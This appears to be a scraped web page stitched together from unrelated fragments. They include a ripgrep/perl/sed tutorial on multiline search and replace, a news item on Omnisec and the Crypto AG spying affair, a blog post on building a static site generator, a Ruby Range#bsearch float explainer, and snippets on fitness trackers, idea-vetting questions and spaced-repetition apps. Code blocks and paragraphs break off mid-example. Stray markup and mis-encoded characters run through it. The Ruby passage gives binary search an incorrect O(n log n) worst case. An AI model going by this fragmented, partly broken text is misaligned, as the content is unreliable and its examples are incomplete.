<pre><code><span>$ rg -NUF -- '-string multiline
search' ip.txt
-string multiline
search with cli tools.
</span></code></pre><h3 id="perl">perl<a href="#perl" aria-label="Anchor link for: perl">🔗</a></h3>
<p>You can use <code>-0777</code> option with <code>perl</code> to slurp the entire input as a single string. Another advantage with <code>perl</code> is that you can use files to pass the search and replace strings. Thus, you don't have to worry about any character that may clash with shell metacharacters. See my <a href="https://learnbyexample.github.io/learn_perl_oneliners/">Perl one-liners cookbook</a> if you are not familiar with using <code>perl</code> from the command line.</p>
<pre><code><span>$ cat search_1.txt
like . () * [] $ {}
^ + ? \ and ' and so on.

# display filename if the given search string matches
$ perl -0777 -nE '!$#ARGV ? $s=$_ :
                  /\Q$s/ &amp;&amp; say $ARGV' search_1.txt ip.txt
ip.txt
</span></code></pre>
<p>However, you'll have to make sure the file doesn't end with a newline if you are providing partial lines for searching, or take care of it within the <code>perl</code> script.</p>
<pre><code><span>$ cat search_2.txt
-string multiline
search

# no output because there's a newline at the end of search_2.txt file
$ perl -0777 -nE '!$#ARGV ? $s=$_ :
                  /\Q$s/ &amp;&amp; say $ARGV' search_2.txt ip.txt

# this will remove newline at the end of file before assigning to $s
$ perl -0777 -nE '!$#ARGV ? $s=s/\n\z//r :
                  /\Q$s/ &amp;&amp; say $ARGV' search_2.txt ip.txt
ip.txt
</span></code></pre>
<p>By default, <code>ripgrep</code> gives entire matching lines. To get rest of the line with <code>perl</code>, you'll have to explicitly add a pattern around the search string.</p>
<pre><code><span># $&amp; variable has the entire matching portion
$ perl -0777 -nE '!$#ARGV ? $s=s/\n\z//r :
                  /\Q$s/ &amp;&amp; say $&amp;' search_2.txt ip.txt
-string multiline
search

# use 'say $&amp; while /.*\Q$s\E.*/g' if there are multiple matches
$ perl -0777 -nE '!$#ARGV ? $s=s/\n\z//r :
                  /.*\Q$s\E.*/ &amp;&amp; say $&amp;' search_2.txt ip.txt
-string multiline
search with cli tools.

<p><code>ripgrep</code> also supports replacing matched string with something else using the <code>-r</code> option. By default, you'll see only matched lines in the output. Use <code>--passthru</code> option to display all the input lines, even if they do not match the given search string. See <a href="https://learnbyexample.github.io/substitution-with-ripgrep/">my blog post</a> for more details about the <code>-r</code> option and various ways you can use it for substitution requirements.</p>

</span></code></pre>
<p>Apart from having to workaround single quote, you'll have to use <code>$$</code> instead of <code>$</code> as it is used for backreferences in the replacement section.</p>
<pre><code><span>$ echo 'sample input' | rg --passthru -F 'in' -r '$a'
sample put
$ echo 'sample input' | rg --passthru -F 'in' -r '$$a'
sample $aput
</span></code></pre><h3 id="perl-1">perl<a href="#perl-1" aria-label="Anchor link for: perl-1">🔗</a></h3>
<p>With <code>perl</code>, you can use files for both search and replace strings. And, you can easily choose to replace first or all occurrences, unlike <code>ripgrep</code> where it always replaces all the matches.</p>
<pre><code><span>$ cat replace.txt

<p><a href="https://github.com/chmln/sd">sd</a> supports fixed string and Rust regexp based substitution. Unlike <code>ripgrep</code>, <code>-s</code> option for fixed string will apply to both search and replacement sections. <code>sd</code> does in-place editing for file inputs by default, you can use <code>-p</code> to preview results on the terminal. Multiline matching is automatically performed by default.</p>

<p>Trailing newlines and ASCII NUL characters will be lost if you wish to save contents of a file as <code>bash</code> variables using <code>var=$(&lt; filename)</code> command. See <a href="https://stackoverflow.com/questions/7427262/how-to-read-a-file-into-a-variable-in-shell/22607352#22607352">stackoverflow: pitfalls of reading file into shell variable</a> for details.</p>

<p>If your search string doesn't have multiple trailing newlines or ASCII NUL characters, then you can save file contents to variables and then pass them to <code>ripgrep</code>. Single trailing newline will not normally cause an issue for searching operations as <code>ripgrep</code> will append a newline while displaying results anyway. If you want to make sure input file also contains the trailing newline, then you can manually concatenate a newline character to the search string.</p>
<pre><code><span>$ s=$(&lt; search_1.txt)
# use "$s"$'\n' if you want to match trailing newline as well
$ rg -NUF "$s" ip.txt
like . () * [] $ {}

# use -- if the search string starts with - character
$ s=$(&lt; search_2.txt)
$ rg -NUF -- "$s" ip.txt

<p>For substitution operations, you'll have to preprocess the replacement file to replace <code>$</code> with <code>$$</code>.</p>
<pre><code><span>$ s=$(&lt; search_1.txt)
$ r=$(sed 's/\$/$$/g' replace.txt)

# here, removal of trailing newline doesn't cause an issue,

<p>Here, partial line has to be matched. So, <code>$()</code> assignment works well for the search string. If the trailing newline of the replacement string isn't needed, then <code>$()</code> assignment again is good enough. Otherwise, you can modify the replacement string as <code>-r "$r"$'\n'</code></p>

<p>To follow a similar approach with <code>GNU sed</code>, you'll have to preprocess the strings to escape metacharacters. Assuming input doesn't have ASCII NUL characters, you can use <code>-z</code> option to slurp entire input as a single string.</p>
<p>Here's an example for multiline search.</p>
<pre><code><span># escape all BRE metacharacters
# replace literal newlines with \n
$ s=$(sed -z 's#[[^$*.\/]#\\&amp;#g; s/\n/\\n/g' search_1.txt)

# since newlines are replaced with \n,
# trailing newlines will be preserved here
$ echo "$s"
like \. () \* \[] \$ {}\n\^ + ? \\ and ' and so on\.\n

# display filename if input matches the given multiline search string
# tr is used to change NUL character after filename to newline
$ sed -nz '/'"$s"'/F' ip.txt | tr '\0' '\n'
ip.txt

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>

    <article>
      
      <time datetime="2020-11-09 00:00:00">November 9, 2020</time>
      <p>On the internet, there is no shortage of good quality <a href="https://jamstack.org/generators/">static site generators</a> (SSGâ€™s) that you can download for free. <a href="https://gohugo.io/">Hugo</a>, <a href="https://jekyllrb.com/">Jekyll</a>, and hundreds of others are readily available. And they work. You can build all kinds of sites with them. I know that, because Iâ€™ve used some of them. Hugo was the driving force behind this website until very recently. Despite that, when I tried to add a new section a while ago, I got rather frustrated with it and decided to build my own generator. It turned out to be a very pleasant experience and not just because I like to program things.</p>
<p>While working on it, I discovered some of the deeper motivations that drove me to undertake this project. On the surface it would seem an odd thing to do, because it takes a lot of time and it appears to offer little benefit. I did not create any new or spectacular functionality. If you click around this site and think: Hey, but I could totally make this with &lt;SSG of choice&gt;, then you would probably be right. But that is not the point. There are certain advantages to making it all yourself and I suspect that these advantages trancend the subject of SSGâ€™s and programming. My speculation is that exploring this direction might also be interesting for people who do not like to program, or maybe even for those who donâ€™t like computers that much at all.</p>
<p>So, why choose this project out so many others that all sound so much more interesting? It is easy to summarize, but without some context it may sound a bit abstract. The real reason for all this work is that I think that a personal site should be personal and to make it personal, one should solely be guided by oneâ€™s intuition and not by the mental models of available tools and the restrictions they impose on your thoughts.</p>
<p>That probably sounded vague and perhaps a little far fetched. After all, as long as you can write the words you want to write, draw the lines you want to draw, you are not limited in your creativity, right? Maybe you are. To make the point more tangible, let me expand on my own situation for a bit. I wil focus on Hugo, since that is the SSG I know best. But the same principles hold for other generators. All other tools even, I believe.</p>
<h2>Metadata and Organising Thoughts</h2>
<p>As said, the list of available static site generators is endless. But somehow they all seem to focus on <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> as markup language to write your posts in. Markdown is very easy to learn and that is probably the reason why it is so popular. Unfortunately, it is a pretty bad markup language for this use case, as it is very incomplete. It is not really a language. Markdown is better seen as a bunch of shortcuts to simplify writing a few common HTML tags. Out of the box you can only sort of markup the body of a document with it. Titles, paragraphs, lists, etc. But not more than that. As we are dealing with a website, shortcuts for HTML tags can be useful, but we need more. For instance, one also needs metadata, like tags, publishing dates, etc. You do want the latest post to be at the top of the newsfeed, right? Then we must find a way to indicate the time when a post was published.</p>
<p>In Hugo this is solved with the awkward concept of <a href="https://gohugo.io/content-management/front-matter/">frontmatter</a>. At the top of each Markdown file, one needs to add a block of text that is not Markdown, but another format. You can pick either YAML, TOML, or JSON. In that block you can specify the things I mentioned. Publishing date, author, category, etc. It is all very flexible, you can even define your own metadata. So you can definitely make a nice looking site out of this.</p>
<p>But the downside is that any blog or article you write is now tied to the system that you use to publish it. Frontmatter is not part of Markdown. It is part of Hugo. So other Markdown tools will not be able to extract that info. Only Hugo can. So if you, like me, like to write all kinds of things, and you want to have some of your writings to end up on your site and others not, a decision that is perhaps made even only after youâ€™ve done the writing, then you have just created a problem. Because now you have to make two piles of writing. One pile for texts that will be published on your site, and another for text that you want to export to, say, PDF. But wait, maybe you <em>also</em> want to compile a selection of your stories and make it into an ebook. And maybe you are really proud of a piece and you want to publish it all three ways at once. It becomes a bit weird, and also very impractical, to store your work then. Are you going to change the document format each time you want to make an export? Are you going to make multiple copies? What happens if you find a spelling error later? This all quickly becomes a big mess.</p>
<p>Ideally, I want to have one folder for storing all my writing. I want to organize that folder the way I think fits best with the content. Then I want to point the site generator to that folder and it should figure out the rest by itself. What needs to be published on my site? Where should it end up? The metadata should be all that is needed to figure it out. And I want the same thing to be true for all other publishers, generators, indexers, etc. that I use, or may want to use in the future. The only solution is then to store your texts in open, tool agnostic document format that can hold all the relevant info. Preferably a plain text format too. Because that part of Markdown I do like. Using simple text editors, Git version control, yes, give me that.</p>
<p>Enter <a href="https://asciidoc.org/">Asciidoc</a>. A Markdown so structured and complete that you can write a whole book in it. Yet is has the same simple way of adding markup and it looks very similar. I will write another post later on how I used a subset of Asciidoc to make my generator. The point I want to make here is that a simple, in my opinion very reasonable requirement to not want to be forced to reorganise and duplicate my files in an illogical way, already rules out 90% of the available tools. And, conversely, that merely by adopting one of those existing tools, you have suddenly become a bit restricted in the way you can think about your creative work.</p>
<p>Think about it. The moment you start anything, the moment where the ideas in your head are not more than undefined glimpses of images or feelings. The moment you have to concentrate really hard to not let the fleeting, still wordless impressions slip. Blink your eyes one time too many and they will be lost, floated away. On <em>that</em> very moment, you get bothered by the question â€œWhere should this end up, once it is finished? Is it a note for my diary, or a book?â€�  That is totally backwards. That should not be the first question about your work, but the last. Not everyone is the same, but for me this upfront question is limiting. Thoughts that are not mature enough to be categorized, are forced to materialize in anyway, so you can put them in the right bucket. And then they slip away.</p>
<h2>Blank Page Instead of Puzzles and Pieces</h2>
<p>By now, some pepole might be thinking: yes, that is all fine, but some generators, like Hugo <em>can</em> use Asciidoc as input and you <em>can</em> set an alternative content path. Surely you can work something out here and configure things the way it suits you?</p>
<p>Well, yes, from the face of it, it might be possible to cobble something up. But that is not going to end up well. Going that route, you will get dragged down in an endless cycle of figuring out options and options of options and in the end, you will be happy to get anything on the screen at all.</p>
<p>Letâ€™s start simple. Some generators say they support Asciidoc, but they donâ€™t do that nativly. At least the ones Iâ€™ve seen. That is, you have to install another piece of software to get the functionality. In this case <a href="https://asciidoctor.org/">Asciidoctor</a>. (And Asciidocter in turn requires Ruby, but I think it ends there.) Then the two pieces must be configured to work together and this must be done on overy device you want to use. This is what developers call a dependency and they are to be avoided wherever possible, as they require you to do work, just to keep things running as they are. At the time of writing you can read <a href="https://gohugo.io/content-management/formats/#additional-formats-through-external-helpers">this</a> in the Hugo documentation on how to configure Asciidoc:</p>
<p><em>â€œAsciiDoc implementation EOLs in Jan 2020 and is no longer supported. AsciiDoc development is being continued under Asciidoctor. The format AsciiDoc remains of course. Please continue with the implementation Asciidoctor.â€�</em></p>
<p>So what this says is that the people behind Hugo saw that a piece of software they relied on, AsciiDoc, was going to be outdated so they switched to another piece of external software, Asciidoctor, to prevent things from breaking. A sensible move. But for you, the user, things are now already broken, because now you have remove the first piece of software, install the second, and configure things again to make them work together. And again, this must be done on all your devices. You get to choose between options, but the options are not stable and require work by you, the user. Sometimes the options have some dependencies themselves, repeating the problem. Not a fun way to spend an afternoon.</p>
<p>But enough about Asciidoc. Letâ€™s talk about templates.</p>
<p>It is wellknown that Hugo has a difficult templating language. This is because Hugo is built in Go and leverages the <a href="https://golang.org/pkg/html/template/">template functionality</a> of the Go standard library. That functionality is fast and elegant, but very much geared to programmers. I knew this beforehand, but since I am a Go developer, I figured this would be an advantage, not a disadvantage. I do this Go stuff all day. It has payed for the laptop I am writing on right now and the chair I am sitting in. Surely this will be easy?</p>
<p>Not so much. Writing Hugo templates turned out to be a moderately frustrating experience. It was an endless game of guessing variables, types and trying to combine them into something useful by chaining functions. There is documentation, every variable and function is listed, but a crucial thing is missing: the big …</p></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>What’s the midpoint between 0 and infinity? Well the answer differs depending on whether you are asking a mathematician, philosopher, or a Ruby developer. I’m not a mathematician or a philosopher, but I am a Ruby developer, so I can tell you than 1.5 is the midpoint between 0 and infinity.</p>  <p><a href="https://ruby-doc.org/core-2.7.2/Range.html#method-i-bsearch"><code>Range#bsearch</code></a> performs binary search within a range. For example, lets use it to find the first integer that’s larger than 42 (which is 43) and see the values it inspects to find it.</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The integer larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>And when we run it, we get the following output:</p> <div><div><pre><code>The integer larger than 42 is: 43
The following values were inspected:
1
2
4
8
16
32
64
32
48
40
44
42
43
</code></pre></div></div> <p>We see typical binary search behavior.</p> <p>A co-worker recently asked me about some odd behavior when we change the starting value to a float. For example, consider the following code, which is the same as the one above but the range is between 0 and <code>Float::INFINITY</code>:</p> <div><div><pre><code><span>values</span> <span>=</span> <span>[]</span>

<span>found_value</span> <span>=</span> <span>(</span><span>0</span><span>..</span><span>Float</span><span>::</span><span>INFINITY</span><span>).</span><span>bsearch</span> <span>do</span> <span>|</span><span>i</span><span>|</span>
  <span>values</span> <span>&lt;&lt;</span> <span>i</span>
  <span>i</span> <span>&gt;</span> <span>42</span>
<span>end</span>

<span>puts</span> <span>"The float larger than 42 is: </span><span>#{</span><span>found_value</span><span>}</span><span>"</span>
<span>puts</span> <span>"The following values were inspected:"</span>
<span>puts</span> <span>values</span>
</code></pre></div></div> <p>We then get the following output when we run it (note that the output has been truncated because it’s too long):</p> <div><div><pre><code>The float larger than 42 is: 42.00000000000001
The following values were inspected:
1.5
1.6759759912428246e+154
1.5921412270130977e+77

42.424560546875
42.1746826171875
...
</code></pre></div></div> <p>The first few values we inspect in the binary search are rather odd: <code>1.5</code>, <code>1.6759759912428246e+154</code>, <code>1.5921412270130977e+77</code>, etc. Where do these numbers come from? To explain these values, we first have to understand how IEEE 754 floating-point numbers work.</p>  <p>Ruby floats are double-precision IEEE 754 floating-point numbers. If you don’t know the basics about how floating-point numbers are represented in memory, there are plenty of resources on the internet, <a href="https://fabiensanglard.net/floating_point_visually_explained/">here’s one</a>.</p> <p>Of special interest to us is how infinity is represented in floating-point. Infinity is a special value where the exponent bits are all 1’s and the significand bits (also known as fraction or mantissa) are all 0’s.</p>  <p>Ruby’s <code>Range#bsearch</code> is implemented in a C function called <a href="https://github.com/ruby/ruby/blob/5512de76033773a77f686f3cb2adc849356f7674/range.c#L680"><code>range_bsearch</code></a>. There are several cases it deals with, and the one of interest is the case when either endpoint is a float. In this case, it performs a clever trick. It reads the C double type of the Ruby float endpoints as 64-bit integers (<code>int64_t</code>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Note that this is <strong>not</strong> the same as casting the double into integer type, this is directly reading the double as a 64-bit integer. Are you confused? I sure was when I first read this code so if you are too, it’ll make more sense later on. Trust me.</p> <p>Let’s revisit how infinity is represented in floating-point. Here’s it visualized (through the help of the amazing website <a href="https://float.exposed/">float.exposed</a>). We can see that the sign is 0 (this is a positive value), all exponent bits are 1, and all significand bits are 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/infinity.png"> </figure> <p>And of course, <code>0</code> is represented in floating-point with all the bits set to 0.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/zero.png"> </figure> <p>So what if we read these bits of the endpoint as if they were integers? Then our range would be between <code>0</code> and <code>9218868437227405312</code>. What’s the midpoint of this range? It’s <code>4609434218613702656</code>. Now let’s plug this value back into <a href="https://float.exposed/0x3ff8000000000000">float.exposed</a>.</p> <figure> <img src="https://blog.peterzhu.ca/assets/ruby-range-bsearch/one_point_five.png"> </figure> <p>Oh look, it’s 1.5!</p> <p>Using this same technique, you can now find out why the binary search examines <code>1.6759759912428246e+154</code> and <code>1.5921412270130977e+77</code> after this. This is left as an exercise for the reader.</p>  <p>The reason why this works is simple once you wrap your head around it. It’s because the more significant bits are always in a more significant position (than the bits to the right of it) in floating-point numbers. This is obviously true for the significand. But this is also true for the exponent because the next power of 2 can’t be reached by just increasing the significand, the exponent has to be increased. So thus a larger exponent will always mean that the floating-point number has a larger magnitude.</p> <p>Once this is true, we can see why binary search works using this technique. It works because if <code>x</code> and <code>y</code> are doubles and <code>x &gt; y</code>, then we have shown that <code>double_as_int64(x) &gt; double_as_int64(y)</code> is also true. This is the requirement for binary search because the values remain strictly increasing (<em>technically</em> binary search only requires monotonically increasing, but strictly increasing is a tighter guarantee than monotonically increasing).</p>  <p>Ruby’s binary search in a range uses a clever technique to perform binary search when the endpoints are doubles while maintaining a worst-case runtime of <code>O(n log n)</code>. In fact, this technique isn’t specific to Ruby and can be used in any language that uses IEEE 754 floating-point numbers.</p>  </div> </article> </div></div>]]>

</span></p><h3 id="viewer-c7o16"><span>How to interpret the results?</span></h3><p id="viewer-fggdn"><span>So both these studies have come back with some pretty negative results, how did this happen?</span></p><p id="viewer-9ceo0"><span>Well according to the lead author on the Pittsburgh study, John Jakicic:</span></p><blockquote id="viewer-8s0cb"><span>“These technologies are focused on physical activity, like taking steps and getting your heart rate up, people would say, 'Oh, I exercised a lot today, now I can eat more.' And they might eat more than they otherwise would have.” </span></blockquote><p id="viewer-drb7s"><span>
This is understandable but surely there must be a reason so many people have invested in smart trackers other than our obsession with wearable tech?</span></p><p id="viewer-rnti"><span>
The point is that these devices will work, for <strong>some people. </strong>That is to say that too many people go and buy these devices hoping they'll motivate them to move more, but this just isn't the case; consumers misperceive what are in fact data trackers as motivational tools.</span></p><blockquote id="viewer-1dp63"><span>
“Fitness trackers are equivalent to a bathroom scale,” says Eric Finkelstein, lead author of the Lancet study. “They’re a measurement tool, not an intervention tool. They tell you something, but don’t give you a strategy for how to change it.”</span></blockquote><h3 id="viewer-4sqnd"><span><strong>Should you still go out and buy one?</strong></span></h3><p id="viewer-fnpda"><span>As I said before, the usefulness of these devices varies from person to person, if you think that receiving a bunch of data about how much you’re moving on a regular basis will motivate to stay active then sure! But if you’re expecting the equivalent of a personal coach on your wrist then think again.</span></p><div id="viewer-ei9pb"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" data-pin-media="https://static.wixstatic.com/media/nsplsh_71537735584b7455797573~mv2_d_4000_2667_s_4_2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/nsplsh_71537735584b7455797573~mv2_d_4000_2667_s_4_2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-6ldtr"><span>However, these companies are making efforts to improve the motivation aspect to their devices, like <a href="https://www.thedetechtor.com/post/apple-event-september-2020-everything-you-need-to-know" target="_blank" rel="noopener"><u>Apple’s activity rings</u></a>, or some devices allowing you to compare your data to your friends and family.

<p>New ideas are always exciting. We get hands-on and start building too early, only to lose interest later.</p>



<p>Here is a list of questions I currently use to reflect on ideas before I build them.</p>



<p><strong>Who am I building for?</strong></p>



<ul><li>Where can I find them?</li><li>Do I have easy access to where they are?</li><li>Can I describe the my potential users in a short sentence?</li></ul>



<p><strong>What problems do they have today?</strong></p>



<ul><li>Can I explain the problem in simple words?</li></ul>



<p><strong>What is my solution?</strong></p>



<ul><li>What do I have to build?</li><li>Is it technically feasible and possible?</li></ul>



<p><strong>What is the current state?</strong></p>



<ul><li>How do people solve it today?</li><li>Who are the competitors? What is wrong with them?</li><li>Is my solution so much better to make them try it?</li><li>Have someone else tried this before?</li><li>What are the reasons for people to not use this? Can I solve this?</li></ul>



<p><strong>Why now?</strong></p>



<ul><li>Why is now the best time to do this?</li><li>Why haven’t anyone thought of this before?</li></ul>



<p><strong>Is this for me?</strong></p>



<ul><li>What is my unfair advantage?</li><li>Is this something I want to do for next 10 years of my life?</li><li>Does it align with my personal vision?</li></ul>



<p>Answering all that question might take a lot of time. But thinking about these things will give you more time to reflect on the idea and decide if it is worth pursuing.</p>

    <p>As many of us have experienced during school years, late-night learning is not the most effective technique. The information might have stuck around for a short period, but just after the day of the exam, it flew away with us unable to recall it. If you would like to remember more during and after your studies, forget the last-minute learning. Using spaced repetition, a method to rehearse educational material, you will not simply earn better grades, but studying would be an overall easier process and memorized information will be available to recall later in your life.</p>

<p>The spaced repetition system is a learning technique in which the material previously learned is recalled by the learner from time to time at ever-increasing intervals. This method is based on the intermittent repetition effect on how we tend to forget information. The primary goal of the technique is to recall the material learned as infrequently as possible, just before we forget it. By approaching repetitions in this scientific way, time spent learning can be used much more efficiently.</p>
<h2>The neurological background of memorizing</h2>
<p>Learning always begins with perception, the form of how we collect information. This data travels through the nerve pathways to the place where the perception is processed, our brain. Some perceptions cause our bodies to react, which usually does not happen consciously.</p>
<p>Scientists once thought that the brain stores memories in a similar way to computers. It was later proved that the artificial approach is completely different: information is broken down into elements (bits) on the computer and is stored that way. The machines can store up to a certain amount of information on a storage device called a hard disk. If our brain would work similarly, despite having hundreds of billions of cells, our internal storage device would have filled up in a matter of hours.</p>
<p>Our brains work in a rather different way: since we always store information in context it is more about capturing the contents of things. That’s why when we recall a memory, related reminiscences come to mind, like smells or the color of the paper, or what we ate for dinner during learning.</p>
<h2>What makes spaced repetition so effective?</h2>
<p>Spaced repetition technique is one of the most effective learning techniques, which you probably use even if you do not know about it. Using this method consciously makes it far superior to standard learning.</p>
<p>There are three key values it provides:</p>
<div>
<p>Delays forgetting learned information by prolonging the forget-curve.</p>
<p>Active recall helps to keep memorized information fresh (as the context layers build-up, it gets easier to remember what you have learned).</p>
<p>Spaced repetition supports long term memory, so you won’t forget the learned information even after the exam.</p>
</div>
<h2>How to get started with the spaced repetition system?</h2>
<p>To put the above in practice, try to remember a movie you’ve seen more than one time. After you’ve watched it first, you understood it well, but a few weeks later you only remembered the title and main story points. You watched it with a friend two months later, and while watching, you have realized that you can recall the story and started to watch out for certain details in the background, or the listening closer to the music. When you watched it for the third time, you probably remembered all the names, a few exact quotes, and the story details too.</p>
<p>Of course, the typical study materials are far from a movie’s excitement, however, learning it works the same. Review your documents and memorize them for the first time. After you have finished, try recalling them in a suitable way: you can write them down or simply rehearse the answers out loud. (Trying to recall it through your inner voice is not the best idea as we all tend to cheat ourselves.)</p>
<p>If you recalled it correctly, put the documents down and start another activity. After an hour try to rehearse it again, maybe using a different method. Then again in a few hours, and on the next day morning. Keep lengthening these intervals until you are ready to face the exam.</p>
<h2>Applications and websites that support you along the journey</h2>
<p>Luckily, today we have multiple choices on how to organize our studies. Different websites, along with applications, will help to study faster and also memorize for the long-term. Let’s see 5 software programs and applications utilizing the spaced repetition system!</p>
<h3>1. <a href="https://quizlet.com/" target="_blank" rel="noopener noreferrer">Quizlet</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Quizlet-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Quizlet-logo.png" alt="Quizlet logo"></picture> <strong>Platforms:</strong> iOS, Android, web</p>
<p><strong>The basic idea:</strong> This is an application that you can use either through your browser or on any mobile device. With one account you can have all your data synchronized, so you can continue your studies away from the computer when it is time to repeat!</p>
<p>The basic idea of Quizlet is that you can search for subjects that already have their case sets and use those, or you can create your own “memorizing cards”. Just enter the term and the definition, and after you are ready, you can start the learning process. Quizlet is also utilized for high-level education and corporate usage, ranging from healthcare studies to Starbucks training programs.</p>
<p>The app is available for students and teachers as well. If you get the vibe of this tool and you want to support it, for a low amount of monthly payment you can also purchase Quizlet Go or Plus for wider and advanced toolkits to create enhanced study sets.</p>
<p><strong>How it fits with SRLT:</strong> After creating or choosing your flashcard set, you can start to memorize the information. When you feel ready, you can choose how to check your knowledge. First is the “Learning” phase: Quizlet will show you the term and you will have to answer it from multiple choices or you will have to type it from memory - and the software will immediately review it. Getting it correctly will set the term as “Familiar”, and after multiple times it will be changed to “Mastered”. Furthermore, this spaced repetition app will give you constant feedback based on your answers, where you are in the learning process, and what you should focus on.</p>
<h3>2. <a href="https://www.edapp.com/" target="_blank" rel="noopener noreferrer">EdApp</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/EdApp-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/EdApp-logo.png" alt="EdApp logo"></picture> <strong>Platforms:</strong> iOS, Android, web</p>
<p><strong>The basic idea:</strong> Signing up for EdApp will give you a choice if you want to educate others or yourself. The registration is fast, and you can immediately create your topic or search in the content library based on your interest.</p>
<p>The contents will be summarized using texts, gifs, and short videos because visualization had a great positive effect on memorizing capabilities. The presentations also have interactive parts, triggering the mind with the element of surprise, stabilizing the learned information. While you are stepping further, EdApp will give you milestones to know where you are in the process.</p>
<p><strong>How it fits with SRLT:</strong> With its sophisticated approach and triggering effects, this spaced repetition software helps to improve memorizing information. On its finalizing page it summarizes the studied content, and based on your answers it gives feedback.</p>
<h3>3. <a href="https://apps.ankiweb.net/" target="_blank" rel="noopener noreferrer">Anki</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Anki-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Anki-logo.png" alt="Anki logo"></picture> <strong>Platforms:</strong> Windows, Mac, Linux, iOS, Android, and any device with a web browser</p>
<p><strong>The basic idea:</strong> Anki is a simple, ad-free software that helps you to create flashcards. After downloading it to your computer or on your mobile phone, the first step is to generate decks, which will include flashcards. All cards have a front- and a backside that you can fill up with information. Also, you can insert pictures and other notes from your classes, so you can memorize those as well. You can also grade the difficulty of the lesson. Anki is mostly used by college students (especially in healthcare). It runs offline, and its ad-free, transparent user interface won’t cause any disturbance during studying.</p>
<p><strong>How it fits with SRLT:</strong> Based on how difficult you have found the lecture, the program will offer you three choices to choose from: to see the lesson again in one minute or to repeat it in ten minutes or four days.</p>
<h3>4. <a href="https://www.brainscape.com/" target="_blank" rel="noopener noreferrer">Brainscape</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Brainscape-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Brainscape-logo.png" alt="Brainscape logo"></picture> <strong>Platforms:</strong> web, Android, iOS</p>
<p><strong>The basic idea:</strong> Brainscape is a specialized spaced repetition system where the algorithm focuses on the areas which need improvements, based on your answers and learning patterns. This is a lively web surface because their team is openly active on other social media websites and showing their results and feedback from users and companies, furthermore, a blog, full of content, is available as well.</p>
<p><strong>How it fits with SRLT:</strong> Brainscape will effectively monitor and check your answers and will support you - if you are honest how well you have known the flash cards’ answers, based on a scale from 1 to 5. It will also measure time during your study phases and help you to memorize information faster.</p>
<h3>5. <a href="http://smartcardsplus.com/" target="_blank" rel="noopener noreferrer">SmartCards+</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/SmartCards-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/SmartCards-logo.png" alt="SmartCards+ logo"></picture> <strong>Platform:</strong> iOS</p>
<p><strong>The basic idea:</strong> Smartcards will support your studies with a learning curve, measure the optimal time, and suggest when to repeat your studies. This spaced repetition app is only available for iOS users.</p>
